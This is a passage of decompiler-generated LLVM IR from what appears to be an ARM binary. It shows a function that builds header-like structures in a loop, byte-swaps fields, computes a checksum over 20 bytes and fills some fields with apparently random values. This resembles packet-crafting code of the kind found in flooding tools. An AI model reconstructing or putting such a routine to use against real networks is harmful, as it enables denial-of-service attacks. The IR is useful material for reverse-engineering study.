  %v3_ac18 = add i32 %v2_ac18, 2
  %v4_ac18 = inttoptr i32 %v3_ac18 to i16*
  store i16 %v1_ac18, i16* %v4_ac18, align 2
  %v0_ac1c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac1c = trunc i32 %v0_ac1c to i8
  %v2_ac1c = load i32, i32* @r4, align 4
  %v3_ac1c = add i32 %v2_ac1c, 13
  %v4_ac1c = inttoptr i32 %v3_ac1c to i8*
  store i8 %v1_ac1c, i8* %v4_ac1c, align 1
  %v0_ac20 = load i32, i32* @r4, align 4
  %v1_ac20 = add i32 %v0_ac20, 13
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab14, i32* %r3.global-to-local, align 4
  %v1_ac28 = and i32 %v4_ac20, 247
  %v5_ac2c = or i32 %v1_ac28, %v4_ac2c
  store i32 %v5_ac2c, i32* %r2.global-to-local, align 4
  %v1_ac30 = trunc i32 %v5_ac2c to i8
  store i8 %v1_ac30, i8* %v2_ac20, align 1
  %v0_ac34 = load i32, i32* @r4, align 4
  %v1_ac34 = add i32 %v0_ac34, 13
  %v2_ac34 = inttoptr i32 %v1_ac34 to i8*
  %v3_ac34 = load i8, i8* %v2_ac34, align 1
  %v4_ac34 = zext i8 %v3_ac34 to i32
  store i32 %v1_ab18, i32* %ip.global-to-local, align 4
  %v1_ac3c = and i32 %v4_ac34, 251
  %v5_ac40 = or i32 %v1_ac3c, %v4_ac40
  store i32 %v5_ac40, i32* %r3.global-to-local, align 4
  %v1_ac44 = trunc i32 %v5_ac40 to i8
  store i8 %v1_ac44, i8* %v2_ac34, align 1
  %v0_ac48 = load i32, i32* @r4, align 4
  %v1_ac48 = add i32 %v0_ac48, 13
  %v2_ac48 = inttoptr i32 %v1_ac48 to i8*
  %v3_ac48 = load i8, i8* %v2_ac48, align 1
  %v4_ac48 = zext i8 %v3_ac48 to i32
  store i32 %v1_ab1c, i32* %r0.global-to-local, align 4
  %v1_ac50 = and i32 %v4_ac48, 253
  %v4_ac54 = or i32 %v1_ac50, %v3_ac54
  store i32 %v4_ac54, i32* %r2.global-to-local, align 4
  %v1_ac58 = trunc i32 %v4_ac54 to i8
  store i8 %v1_ac58, i8* %v2_ac48, align 1
  %v0_ac5c = load i32, i32* @r4, align 4
  %v1_ac5c = add i32 %v0_ac5c, 13
  %v2_ac5c = inttoptr i32 %v1_ac5c to i8*
  %v3_ac5c = load i8, i8* %v2_ac5c, align 1
  %v4_ac5c = zext i8 %v3_ac5c to i32
  store i32 %v1_ab20, i32* %r1.global-to-local, align 4
  %v1_ac64 = and i32 %v4_ac5c, 254
  %v2_ac68 = or i32 %v1_ac64, %v1_ab20
  store i32 %v2_ac68, i32* %r3.global-to-local, align 4
  %v1_ac6c = trunc i32 %v2_ac68 to i8
  store i8 %v1_ac6c, i8* %v2_ac5c, align 1
  %v0_ac70 = call i32 @function_e0b8()
  %v1_ac70 = trunc i32 %v0_ac70 to i16
  store i32 %v0_ac70, i32* %r0.global-to-local, align 4
  store i32 %v1_ab24, i32* %r2.global-to-local, align 4
  store i1 %v2_ac78, i1* %cpsr_z.global-to-local, align 1
  %v3_ac84.pre = load i32, i32* @r4, align 4
  br i1 %v2_ac78, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_ac7c = add i32 %v3_ac84.pre, 13
  %v3_ac7c = inttoptr i32 %v2_ac7c to i8*
  %v4_ac7c = load i8, i8* %v3_ac7c, align 1
  %v5_ac7c = zext i8 %v4_ac7c to i32
  %v2_ac80 = or i32 %v5_ac7c, 8
  store i32 %v2_ac80, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_ac84 = add i32 %v3_ac84.pre, 14
  %v5_ac84 = inttoptr i32 %v4_ac84 to i16*
  store i16 %v1_ac70, i16* %v5_ac84, align 2
  store i32 %v6_a9d4, i32* %r1.global-to-local, align 4
  %v0_ac8c = load i32, i32* @r5, align 4
  %v1_ac8c = add i32 %v0_ac8c, 40
  store i32 %v1_ac8c, i32* %r0.global-to-local, align 4
  br i1 %v2_ac78, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_ac90 = load i32, i32* @r3, align 4
  %v2_ac90 = trunc i32 %v1_ac90 to i8
  %v3_ac90 = load i32, i32* @r4, align 4
  %v4_ac90 = add i32 %v3_ac90, 13
  %v5_ac90 = inttoptr i32 %v4_ac90 to i8*
  store i8 %v2_ac90, i8* %v5_ac90, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_ac94 = inttoptr i32 %v1_ac8c to i16*
  %v3_ac94 = call i32 @function_e24c(i16* %v2_ac94, i32 %v6_a9d4)
  store i32 %v3_ac94, i32* %r0.global-to-local, align 4
  %v3_ac98 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ac98, i32* %r3.global-to-local, align 4
  %v1_ac9c = add i32 %v3_ac98, 1
  store i32 %v1_ac9c, i32* @r4, align 4
  %v1_aca0 = load i32, i32* @r7, align 4
  %v9_aca0 = icmp eq i32 %v1_ac9c, %v1_aca0
  store i1 %v9_aca0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ac9c, i32* %stack_var_-44, align 4
  %v5_aca8 = icmp slt i32 %v1_ac9c, %v1_aca0
  br i1 %v5_aca8, label %dec_label_pc_ab44, label %dec_label_pc_acac

dec_label_pc_acac:                                ; preds = %bb70
  store i32 %v6_a9d4, i32* %r3.global-to-local, align 4
  %v1_acb0 = add i32 %v6_a9d4, 20
  store i32 %v1_acb0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_acb8

dec_label_pc_acb8:                                ; preds = %dec_label_pc_aefc, %dec_label_pc_acac
  %v0_acd08 = phi i32 [ %v1_aca0, %dec_label_pc_acac ], [ 0, %dec_label_pc_aefc ]
  %stack_var_-140.0 = phi i32 [ %v3_aa94, %dec_label_pc_acac ], [ %v3_af08, %dec_label_pc_aefc ]
  %storemerge = add i32 %v6_a9d4, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acbc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acbc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acbc, 256
  %v3_acc4 = and i32 %tmp71, 65280
  store i32 %v3_acc4, i32* %r3.global-to-local, align 4
  %v4_acc8 = udiv i32 %v1_acbc, 16777216
  %v5_acc8 = or i32 %v3_acc4, %v4_acc8
  store i32 %v5_acc8, i32* @sl, align 4
  %v3_ae68 = icmp eq i32 %v3_aa6c, 65535
  %v2_aecc = icmp eq i32 %v1_a9fc, 0
  %v2_ad08 = icmp eq i32 %v6_aa10, -1
  %v7_ad08 = icmp eq i32 %v6_aa10, -1
  br label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_accc, %dec_label_pc_ade4, %dec_label_pc_acb8
  %v0_acd0 = phi i32 [ %v0_acd08, %dec_label_pc_acb8 ], [ 0, %dec_label_pc_ade4 ], [ 0, %dec_label_pc_accc ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acd0 = icmp eq i32 %v0_acd0, 0
  store i1 %v2_acd0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_acd0, label %dec_label_pc_accc, label %dec_label_pc_acdc

dec_label_pc_acdc:                                ; preds = %dec_label_pc_accc, %dec_label_pc_ade4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ace0

dec_label_pc_ace0:                                ; preds = %dec_label_pc_ad60, %dec_label_pc_acdc
  %v1_acf4 = phi i32 [ %v1_add4, %dec_label_pc_ad60 ], [ 0, %dec_label_pc_acdc ]
  %v5_ace4 = mul i32 %v1_acf4, 24
  %v1_ace8 = load i32, i32* @r8, align 4
  %v2_ace8 = add i32 %v1_ace8, %v5_ace4
  store i32 %v2_ace8, i32* %r3.global-to-local, align 4
  store i32 %v2_a840, i32* %ip.global-to-local, align 4
  %v1_acf0 = add i32 %v2_ace8, 20
  %v2_acf0 = inttoptr i32 %v1_acf0 to i8*
  %v3_acf0 = load i8, i8* %v2_acf0, align 1
  %v4_acf0 = zext i8 %v3_acf0 to i32
  store i32 %v4_acf0, i32* %r2.global-to-local, align 4
  %v4_acf4 = mul i32 %v1_acf4, 4
  %v5_acf4 = add i32 %v4_acf4, %v2_a840
  %v6_acf4 = inttoptr i32 %v5_acf4 to i32*
  %v7_acf4 = load i32, i32* %v6_acf4, align 4
  store i32 %v7_acf4, i32* @r5, align 4
  %v7_acf8 = icmp eq i8 %v3_acf0, 31
  store i1 %v7_acf8, i1* %cpsr_z.global-to-local, align 1
  %v1_acfc = add i32 %v7_acf4, 20
  store i32 %v1_acfc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_acf0, 32
  br i1 %tmp77, label %dec_label_pc_adf8, label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ace0
  store i32 %v6_aa10, i32* %r0.global-to-local, align 4
  store i1 %v7_ad08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad08, label %dec_label_pc_ae58, label %dec_label_pc_ad10

dec_label_pc_ad10:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_ad04
  store i32 %v3_aa6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ae68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ae68, label %dec_label_pc_ae74, label %dec_label_pc_ad24

dec_label_pc_ad24:                                ; preds = %dec_label_pc_ae58.dec_label_pc_ad24_crit_edge, %dec_label_pc_ad10
  %v1_ad28 = phi i32 [ %v1_ad28.pre, %dec_label_pc_ae58.dec_label_pc_ad24_crit_edge ], [ 65535, %dec_label_pc_ad10 ]
  store i32 %v3_aa70, i32* %r2.global-to-local, align 4
  %v9_ad28 = icmp eq i32 %v3_aa70, %v1_ad28
  store i1 %v9_ad28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad28, label %dec_label_pc_ae88, label %dec_label_pc_ad30

dec_label_pc_ad30:                                ; preds = %dec_label_pc_ae74.dec_label_pc_ad30_crit_edge, %dec_label_pc_ad24
  %v1_ad34 = phi i32 [ %v1_ad34.pre, %dec_label_pc_ae74.dec_label_pc_ad30_crit_edge ], [ %v1_ad28, %dec_label_pc_ad24 ]
  store i32 %v3_aa74, i32* %r3.global-to-local, align 4
  %v9_ad34 = icmp eq i32 %v3_aa74, %v1_ad34
  store i1 %v9_ad34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad34, label %dec_label_pc_ae9c, label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge, %dec_label_pc_ad30
  %v1_ad40 = phi i32 [ %v1_ad40.pre, %dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge ], [ %v1_ad34, %dec_label_pc_ad30 ]
  store i32 %v6_a910, i32* %ip.global-to-local, align 4
  %v9_ad40 = icmp eq i32 %v6_a910, %v1_ad40
  store i1 %v9_ad40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad40, label %dec_label_pc_aeb0, label %dec_label_pc_ad48

dec_label_pc_ad48:                                ; preds = %dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge, %dec_label_pc_ad3c
  %v1_ad4c = phi i32 [ %v1_ad4c.pre, %dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge ], [ %v1_ad40, %dec_label_pc_ad3c ]
  store i32 %v6_a92c, i32* %r0.global-to-local, align 4
  %v9_ad4c = icmp eq i32 %v6_a92c, %v1_ad4c
  store i1 %v9_ad4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad4c, label %dec_label_pc_aec4, label %dec_label_pc_ad54

dec_label_pc_ad54:                                ; preds = %dec_label_pc_aeb0, %dec_label_pc_ad48
  store i32 %v1_a9fc, i32* %r1.global-to-local, align 4
  store i1 %v2_aecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aecc, label %dec_label_pc_ad60, label %dec_label_pc_aed8

dec_label_pc_ad60:                                ; preds = %dec_label_pc_ad54, %dec_label_pc_aec4, %dec_label_pc_aed8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ad64 = load i32, i32* @r5, align 4
  %v3_ad64 = add i32 %v2_ad64, 10
  %v4_ad64 = inttoptr i32 %v3_ad64 to i16*
  store i16 0, i16* %v4_ad64, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ad6c = load i32, i32* @r5, align 4
  store i32 %v0_ad6c, i32* @r0, align 4
  %v2_ad70 = call i32 @function_c848(i32 %v0_ad6c, i32 20)
  %v3_ad70 = trunc i32 %v2_ad70 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ad78 = load i32, i32* @r5, align 4
  %v4_ad78 = add i32 %v3_ad78, 10
  %v5_ad78 = inttoptr i32 %v4_ad78 to i16*
  store i16 %v3_ad70, i16* %v5_ad78, align 2
  %v0_ad7c = load i32, i32* @r6, align 4
  store i32 %v0_ad7c, i32* @r1, align 4
  %v0_ad80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ad80 = trunc i32 %v0_ad80 to i16
  %v3_ad80 = add i32 %v0_ad7c, 16
  %v4_ad80 = inttoptr i32 %v3_ad80 to i16*
  store i16 %v1_ad80, i16* %v4_ad80, align 2
  %v0_ad84 = load i32, i32* @sl, align 4
  store i32 %v0_ad84, i32* %r2.global-to-local, align 4
  %v0_ad88 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ad88, i32* %r3.global-to-local, align 4
  %v0_ad8c = load i32, i32* @r5, align 4
  store i32 %v0_ad8c, i32* %r0.global-to-local, align 4
  %v4_ad90 = call i32 @function_c898(i32 %v0_ad8c, i32 %v0_ad7c, i32 %v0_ad84, i32 %v0_ad88)
  %v5_ad90 = trunc i32 %v4_ad90 to i16
  store i32 %v4_ad90, i32* %r0.global-to-local, align 4
  %v3_ad94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad94, i32* %r3.global-to-local, align 4
  %v3_ad98 = mul i32 %v3_ad94, 32
  store i32 %v3_ad98, i32* %lr.global-to-local, align 4
  %v3_ad9c = load i32, i32* @r6, align 4
  %v4_ad9c = add i32 %v3_ad9c, 16
  %v5_ad9c = inttoptr i32 %v4_ad9c to i16*
  store i16 %v5_ad90, i16* %v5_ad9c, align 2
  %v0_ada0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ada0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ada0, -8
  %v5_ada0 = add i32 %v0_ada0, %tmp78
  store i32 %v5_ada0, i32* %lr.global-to-local, align 4
  %v0_ada4 = load i32, i32* @r6, align 4
  %v1_ada4 = add i32 %v0_ada4, 2
  %v2_ada4 = inttoptr i32 %v1_ada4 to i16*
  %v3_ada4 = load i16, i16* %v2_ada4, align 2
  %v1_ada8 = load i32, i32* @r8, align 4
  %v2_ada8 = add i32 %v1_ada8, %v5_ada0
  store i32 %v2_ada8, i32* @lr, align 4
  %v3_adac = add i32 %v2_ada8, 2
  %v4_adac = inttoptr i32 %v3_adac to i16*
  store i16 %v3_ada4, i16* %v4_adac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adb8 = load i32, i32* @r5, align 4
  store i32 %v0_adb8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa24, i32* %r0.global-to-local, align 4
  %v0_adc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_adc0, i32* %r2.global-to-local, align 4
  %v0_adc4 = load i32, i32* @lr, align 4
  %v6_adcc = call i32 @function_11570(i32 %v3_aa24, i32 %v0_adb8, i32 %v0_adc0, i32 16384, i32 %v0_adc4, i32 16)
  %v3_add0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add0, i32* %r3.global-to-local, align 4
  %v1_add4 = add i32 %v3_add0, 1
  store i32 %v1_add4, i32* %r0.global-to-local, align 4
  %v1_add8 = load i32, i32* @r7, align 4
  %v9_add8 = icmp eq i32 %v1_add4, %v1_add8
  store i1 %v9_add8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_add4, i32* %stack_var_-44, align 4
  %v5_ade0 = icmp slt i32 %v1_add4, %v1_add8
  br i1 %v5_ade0, label %dec_label_pc_ace0, label %dec_label_pc_ade4

dec_label_pc_ade4:                                ; preds = %dec_label_pc_ad60
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ade8 = icmp eq i32 %v1_add8, 0
  store i1 %v2_ade8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ade8, label %dec_label_pc_accc, label %dec_label_pc_acdc

dec_label_pc_adf8:                                ; preds = %dec_label_pc_ace0
  %v1_adf8 = add i32 %v2_ace8, 16
  %v2_adf8 = inttoptr i32 %v1_adf8 to i32*
  %v3_adf8 = load i32, i32* %v2_adf8, align 4
  %v0_adfc = call i32 @function_e0b8()
  store i32 %v0_adfc, i32* %r0.global-to-local, align 4
  %v3_ae00 = load i32, i32* %stack_var_-44, align 4
  %v5_ae08 = mul i32 %v3_ae00, 24
  %v1_ae0c = and i32 %v3_adf8, 16711680
  store i32 %v1_ae0c, i32* %ip.global-to-local, align 4
  %v3_ae10 = udiv i32 %v3_adf8, 16777216
  %v4_ae14 = udiv i32 %v1_ae0c, 256
  %v5_ae14 = or i32 %v4_ae14, %v3_ae10
  store i32 %v5_ae14, i32* %r2.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r8, align 4
  %v2_ae18 = add i32 %v1_ae18, %v5_ae08
  store i32 %v2_ae18, i32* %r1.global-to-local, align 4
  %v1_ae1c = and i32 %v3_adf8, 65280
  store i32 %v1_ae1c, i32* %r3.global-to-local, align 4
  %v1_ae20 = add i32 %v2_ae18, 20
  %v2_ae20 = inttoptr i32 %v1_ae20 to i8*
  %v3_ae20 = load i8, i8* %v2_ae20, align 1
  %v4_ae20 = zext i8 %v3_ae20 to i32
  store i32 %v4_ae20, i32* %ip.global-to-local, align 4
  %v5_ae28 = call i32 @llvm.bswap.i32(i32 %v3_adf8)
  %v7_ae2c = lshr i32 %v0_adfc, %v4_ae20
  %v8_ae2c = add i32 %v7_ae2c, %v5_ae28
  store i32 %v8_ae2c, i32* %r2.global-to-local, align 4
  %v1_ae3c = and i32 %v8_ae2c, 65280
  store i32 %v1_ae3c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa10, i32* %r0.global-to-local, align 4
  %v5_ae48 = call i32 @llvm.bswap.i32(i32 %v8_ae2c)
  store i32 %v5_ae48, i32* %r3.global-to-local, align 4
  store i1 %v7_ad08, i1* %cpsr_z.global-to-local, align 1
  %v1_ae50 = load i32, i32* @r5, align 4
  %v2_ae50 = add i32 %v1_ae50, 16
  %v3_ae50 = inttoptr i32 %v2_ae50 to i32*
  store i32 %v5_ae48, i32* %v3_ae50, align 4
  br i1 %v2_ad08, label %dec_label_pc_ae58, label %dec_label_pc_ad10

dec_label_pc_ae58:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_ad04
  %v0_ae58 = call i32 @function_e0b8()
  store i32 %v0_ae58, i32* %r0.global-to-local, align 4
  store i32 %v3_aa6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ae68, i1* %cpsr_z.global-to-local, align 1
  %v1_ae6c = load i32, i32* @r5, align 4
  %v2_ae6c = add i32 %v1_ae6c, 12
  %v3_ae6c = inttoptr i32 %v2_ae6c to i32*
  store i32 %v0_ae58, i32* %v3_ae6c, align 4
  br i1 %v3_ae68, label %dec_label_pc_ae74, label %dec_label_pc_ae58.dec_label_pc_ad24_crit_edge

dec_label_pc_ae58.dec_label_pc_ad24_crit_edge:    ; preds = %dec_label_pc_ae58
  %v1_ad28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad24

dec_label_pc_ae74:                                ; preds = %dec_label_pc_ae58, %dec_label_pc_ad10
  %v0_ae74 = call i32 @function_e0b8()
  %v1_ae74 = trunc i32 %v0_ae74 to i16
  store i32 %v0_ae74, i32* %r0.global-to-local, align 4
  store i32 %v3_aa70, i32* %r2.global-to-local, align 4
  %v1_ae7c = load i32, i32* @r4, align 4
  %v9_ae7c = icmp eq i32 %v3_aa70, %v1_ae7c
  store i1 %v9_ae7c, i1* %cpsr_z.global-to-local, align 1
  %v3_ae80 = load i32, i32* @r5, align 4
  %v4_ae80 = add i32 %v3_ae80, 4
  %v5_ae80 = inttoptr i32 %v4_ae80 to i16*
  store i16 %v1_ae74, i16* %v5_ae80, align 2
  br i1 %v9_ae7c, label %dec_label_pc_ae88, label %dec_label_pc_ae74.dec_label_pc_ad30_crit_edge

dec_label_pc_ae74.dec_label_pc_ad30_crit_edge:    ; preds = %dec_label_pc_ae74
  %v1_ad34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad30

dec_label_pc_ae88:                                ; preds = %dec_label_pc_ae74, %dec_label_pc_ad24
  %v0_ae88 = call i32 @function_e0b8()
  %v1_ae88 = trunc i32 %v0_ae88 to i16
  store i32 %v0_ae88, i32* %r0.global-to-local, align 4
  store i32 %v3_aa74, i32* %r3.global-to-local, align 4
  %v1_ae90 = load i32, i32* @r4, align 4
  %v9_ae90 = icmp eq i32 %v3_aa74, %v1_ae90
  store i1 %v9_ae90, i1* %cpsr_z.global-to-local, align 1
  %v3_ae94 = load i32, i32* @r5, align 4
  %v4_ae94 = add i32 %v3_ae94, 20
  %v5_ae94 = inttoptr i32 %v4_ae94 to i16*
  store i16 %v1_ae88, i16* %v5_ae94, align 2
  br i1 %v9_ae90, label %dec_label_pc_ae9c, label %dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge

dec_label_pc_ae88.dec_label_pc_ad3c_crit_edge:    ; preds = %dec_label_pc_ae88
  %v1_ad40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad3c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae88, %dec_label_pc_ad30
  %v0_ae9c = call i32 @function_e0b8()
  %v1_ae9c = trunc i32 %v0_ae9c to i16
  store i32 %v0_ae9c, i32* %r0.global-to-local, align 4
  store i32 %v6_a910, i32* %ip.global-to-local, align 4
  %v1_aea4 = load i32, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %v6_a910, %v1_aea4
  store i1 %v9_aea4, i1* %cpsr_z.global-to-local, align 1
  %v3_aea8 = load i32, i32* @r6, align 4
  %v4_aea8 = add i32 %v3_aea8, 2
  %v5_aea8 = inttoptr i32 %v4_aea8 to i16*
  store i16 %v1_ae9c, i16* %v5_aea8, align 2
  br i1 %v9_aea4, label %dec_label_pc_aeb0, label %dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge

dec_label_pc_ae9c.dec_label_pc_ad48_crit_edge:    ; preds = %dec_label_pc_ae9c
  %v1_ad4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad48

dec_label_pc_aeb0:                                ; preds = %dec_label_pc_ae9c, %dec_label_pc_ad3c
  %v0_aeb0 = call i32 @function_e0b8()
  %v1_aeb4 = load i32, i32* @r6, align 4
  %v2_aeb4 = add i32 %v1_aeb4, 4
  %v3_aeb4 = inttoptr i32 %v2_aeb4 to i32*
  store i32 %v0_aeb0, i32* %v3_aeb4, align 4
  store i32 %v6_a92c, i32* %r0.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v6_a92c, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aebc, label %dec_label_pc_aec4, label %dec_label_pc_ad54

dec_label_pc_aec4:                                ; preds = %dec_label_pc_aeb0, %dec_label_pc_ad48
  %v0_aec4 = call i32 @function_e0b8()
  store i32 %v0_aec4, i32* %r0.global-to-local, align 4
  store i32 %v1_a9fc, i32* %r1.global-to-local, align 4
  store i1 %v2_aecc, i1* %cpsr_z.global-to-local, align 1
  %v1_aed0 = load i32, i32* @r6, align 4
  %v2_aed0 = add i32 %v1_aed0, 8
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aec4, i32* %v3_aed0, align 4
  br i1 %v2_aecc, label %dec_label_pc_ad60, label %dec_label_pc_aed8

dec_label_pc_aed8:                                ; preds = %dec_label_pc_ad54, %dec_label_pc_aec4
  %v0_aed8 = load i32, i32* @r5, align 4
  %v1_aed8 = add i32 %v0_aed8, 40
  store i32 %v1_aed8, i32* %r0.global-to-local, align 4
  store i32 %v6_a9d4, i32* %r1.global-to-local, align 4
  %v2_aee0 = inttoptr i32 %v1_aed8 to i16*
  %v3_aee0 = call i32 @function_e24c(i16* %v2_aee0, i32 %v6_a9d4)
  store i32 %v3_aee0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad60

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aa34
  store i32 %v3_aa24, i32* %r0.global-to-local, align 4
  %v1_aeec = call i32 @function_10ddc(i32 %v3_aa24)
  store i32 %v1_aeec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_a824, %dec_label_pc_aee8
  %v1_aef8 = phi i32 [ %v3_aa24, %dec_label_pc_a824 ], [ %v1_aeec, %dec_label_pc_aee8 ]
  store i32 %v18_a824, i32* %sb.global-to-local, align 4
  store i32 %v24_a824, i32* %fp.global-to-local, align 4
  store i32 %v27_a824, i32* %lr.global-to-local, align 4
  ret i32 %v1_aef8

dec_label_pc_aefc:                                ; preds = %dec_label_pc_aa5c
  store i32 %v6_a9d4, i32* %r0.global-to-local, align 4
  %v1_af04 = add i32 %v6_a9d4, 20
  store i32 %v1_af04, i32* %sb.global-to-local, align 4
  %v3_af08 = mul i32 %v6_a9d4, 65536
  store i32 %v3_af08, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acb8

; uselistorder directives
  uselistorder i32 %v0_ae9c, { 1, 0 }
  uselistorder i32 %v0_ae88, { 1, 0 }
  uselistorder i32 %v0_ae74, { 1, 0 }
  uselistorder i32 %v5_ae48, { 1, 0 }
  uselistorder i32 %v3_adf8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_add4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ada0, { 1, 0 }
  uselistorder i32 %v4_ad90, { 1, 0 }
  uselistorder i1 %v7_ad08, { 2, 1, 0 }
  uselistorder i1 %v2_aecc, { 2, 3, 1, 0 }
  uselistorder i1 %v3_ae68, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_ac9c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ac70, { 1, 0 }
  uselistorder i32 %v1_ab24, { 1, 2, 0 }
  uselistorder i32 %v1_ab20, { 2, 1, 0 }
  uselistorder i32 %v1_ab1c, { 2, 0, 1 }
  uselistorder i32 %v1_ab18, { 2, 0, 1 }
  uselistorder i32 %v1_ab14, { 2, 0, 1 }
  uselistorder i32 %v1_aaec, { 1, 0 }
  uselistorder i32 %v3_aa94, { 1, 0 }
  uselistorder i32 %v3_aa6c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_aa64, { 1, 0, 2 }
  uselistorder i32 %v0_aa60, { 1, 0, 2 }
  uselistorder i32 %v0_aa5c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa54, { 1, 0 }
  uselistorder i1 %v7_aa28, { 1, 0 }
  uselistorder i32 %v3_aa24, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa10, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_a9fc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_a9d4, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a92c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a910, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a8c0, { 1, 2, 0 }
  uselistorder i32 %v5_a8b4, { 0, 2, 1 }
  uselistorder i32 %v5_a87c, { 0, 2, 1 }
  uselistorder i32 %v2_a840, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
